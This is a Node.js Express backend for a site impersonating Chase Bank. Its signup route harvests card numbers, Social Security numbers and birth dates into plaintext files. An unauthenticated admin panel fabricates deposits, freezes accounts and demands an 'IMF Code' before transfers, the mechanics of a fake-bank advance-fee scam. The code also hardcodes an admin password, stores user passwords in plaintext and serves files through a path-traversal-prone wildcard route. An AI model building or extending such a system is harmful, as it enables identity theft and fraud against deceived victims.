const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// --- DATA UTILITIES ---
const dataPath = (file) => path.join(__dirname, 'data', file);

const readJSON = (file) => {
    try {
        if (!fs.existsSync(dataPath(file))) return [];
        return JSON.parse(fs.readFileSync(dataPath(file), 'utf8'));
    } catch (err) { return []; }
};

const writeJSON = (file, data) => {
    fs.writeFileSync(dataPath(file), JSON.stringify(data, null, 2));
};

// --- AUTH ROUTES ---

// Sign Up
app.post('/api/signup', (req, res) => {
    const { firstName, lastName, email, username, password, cardNum, ssn, dob } = req.body;
    const users = readJSON('users.json');
    const accounts = readJSON('accounts.json');

    if (users.find(u => u.username === username || u.email === email)) {
        return res.status(400).json({ success: false, message: 'User already exists' });
    }

    const userId = 'usr_' + Date.now();
    const newUser = {
        userId, firstName, lastName, email, username, password, 
        cardNum, ssn, dob,
        phone: '(555) 000-0000', 
        status: 'successful', 
        authVerification: { enabled: false, authName: '', authCode: '' }, 
        adminNote: '',
        joined: new Date().toISOString()
    };
    users.push(newUser);

    const accountId = 'acc_' + Math.floor(1000000000 + Math.random() * 9000000000); 
    const newAccount = {
        accountId,
        userId,
        accountName: 'CHASE TOTAL CHECKING',
        accountNumber: accountId.replace('acc_', ''),
        balance: 0.00,
        status: 'Active'
    };
    accounts.push(newAccount);

    writeJSON('users.json', users);
    writeJSON('accounts.json', accounts);

    res.json({ success: true, message: 'Account created successfully' });
});

// Login
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const users = readJSON('users.json');
    const user = users.find(u => u.username === username && u.password === password);
    
    if (user) {
        res.json({ success: true, userId: user.userId, firstName: user.firstName });
    } else {
        res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
});

// Admin Login
app.post('/api/admin-login', (req, res) => {
    const { email, password } = req.body;
    if (email === "admin@chasebank.com" && password === "tqn8e5RLVVd2") {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, message: 'Invalid Admin credentials' });
    }
});

// --- ADMIN API ENDPOINTS ---

app.get('/api/admin/data', (req, res) => {
    const users = readJSON('users.json');
    const accounts = readJSON('accounts.json');
    res.json({ users, accounts });
});

app.post('/api/admin/update-user', (req, res) => {
    const { userId, status, adminNote, authVerification } = req.body;
    const users = readJSON('users.json');
    const userIndex = users.findIndex(u => u.userId === userId);

    if (userIndex === -1) return res.status(404).json({ success: false, message: 'User not found' });

    users[userIndex].status = status;
    users[userIndex].adminNote = adminNote;
    users[userIndex].authVerification = authVerification;

    writeJSON('users.json', users);
    res.json({ success: true, message: 'User updated successfully' });
});

app.post('/api/admin/transaction', (req, res) => {
    const { accountNumber, amount, type, merchant, date, description } = req.body;
    const accounts = readJSON('accounts.json');
    const transactions = readJSON('transactions.json');
    const notifications = readJSON('notifications.json');

    const accountIndex = accounts.findIndex(a => a.accountNumber === accountNumber);
    if (accountIndex === -1) return res.status(404).json({ success: false, message: 'Account not found' });

    const numericAmount = parseFloat(amount);
    
    if (type === 'credit') accounts[accountIndex].balance += numericAmount;
    if (type === 'debit') accounts[accountIndex].balance -= numericAmount;

    transactions.unshift({
        transactionId: 'tx_' + Date.now(),
        accountId: accounts[accountIndex].accountId,
        merchant: merchant || description || 'Admin Adjustment',
        date: date || new Date().toISOString(),
        amount: type === 'credit' ? numericAmount : -numericAmount,
        status: 'Posted',
        type: type
    });

    notifications.unshift({
        id: 'notif_' + Date.now(),
        type: 'alert',
        title: type === 'credit' ? 'Deposit Received' : 'Funds Debited',
        message: `${type === 'credit' ? 'Credit' : 'Debit'} of $${numericAmount} processed.`,
        date: new Date().toLocaleDateString(),
        read: false,
        icon: type === 'credit' ? 'fas fa-arrow-down' : 'fas fa-minus-circle'
    });

    writeJSON('accounts.json', accounts);
    writeJSON('transactions.json', transactions);
    writeJSON('notifications.json', notifications);

    res.json({ success: true, message: 'Transaction processed' });
});

// --- USER TRANSFER LOGIC ---
app.post('/api/transfer', (req, res) => {
    const { userId, amount, recipient, imfCode } = req.body;
    
    const users = readJSON('users.json');
    const accounts = readJSON('accounts.json');
    const transactions = readJSON('transactions.json');

    const user = users.find(u => u.userId === userId);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });

    if (user.status === 'frozen' || user.status === 'suspended') {
        return res.json({ 
            success: false, 
            errorType: 'BLOCK', 
            message: `Transaction Failed: Your account status is ${user.status.toUpperCase()}. Please contact support.` 
        });
    }

    if (user.authVerification && user.authVerification.enabled) {
        if (!imfCode || imfCode !== user.authVerification.authCode) {
            return res.json({ 
                success: false, 
                errorType: 'AUTH_REQUIRED', 
                authName: user.authVerification.authName || 'IMF Code', 
                message: 'Verification Required' 
            });
        }
    }

    const accountIndex = accounts.findIndex(a => a.userId === userId);
    if (accountIndex === -1) return res.json({ success: false, message: 'No account found' });

    if (accounts[accountIndex].balance < amount) {
        return res.json({ success: false, message: 'Insufficient funds' });
    }

    accounts[accountIndex].balance -= parseFloat(amount);

    transactions.unshift({
        transactionId: 'tx_' + Date.now(),
        accountId: accounts[accountIndex].accountId,
        merchant: `Transfer to ${recipient}`,
        date: new Date().toISOString(),
        amount: -parseFloat(amount),
        status: 'Posted',
        type: 'debit'
    });

    writeJSON('accounts.json', accounts);
    writeJSON('transactions.json', transactions);

    const receipt = {
        date: new Date().toLocaleString(),
        amount: amount,
        recipient: recipient,
        ref: 'Ref: ' + Math.floor(100000000 + Math.random() * 900000000)
    };

    res.json({ success: true, receipt });
});

// --- USER DATA FETCH ---
app.get('/api/my-data', (req, res) => {
    const { userId } = req.query;
    if(!userId) return res.status(400).json({ error: 'No User ID' });

    const users = readJSON('users.json');
    const accounts = readJSON('accounts.json');
    const transactions = readJSON('transactions.json');
    const notifications = readJSON('notifications.json'); 

    const user = users.find(u => u.userId === userId);
    const myAccounts = accounts.filter(a => a.userId === userId);
    const myTransactions = transactions
        .filter(t => myAccounts.some(a => a.accountId === t.accountId))
        .sort((a, b) => new Date(b.date) - new Date(a.date));

    res.json({ user, accounts: myAccounts, transactions: myTransactions, notifications }); 
});

// --- SERVE FILES (THE FIX IS HERE) ---

// 1. Root route
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));

// 2. Explicit Admin Routes (This prevents fallback to user login)
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
});

// This route was missing in your code!
app.get('/admin-dashboard.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// 3. Fallback for everything else
app.get('*', (req, res) => {
    if (fs.existsSync(path.join(__dirname, 'public', req.path))) {
        res.sendFile(path.join(__dirname, 'public', req.path));
    } else {
        res.sendFile(path.join(__dirname, 'public', 'login.html'));
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});


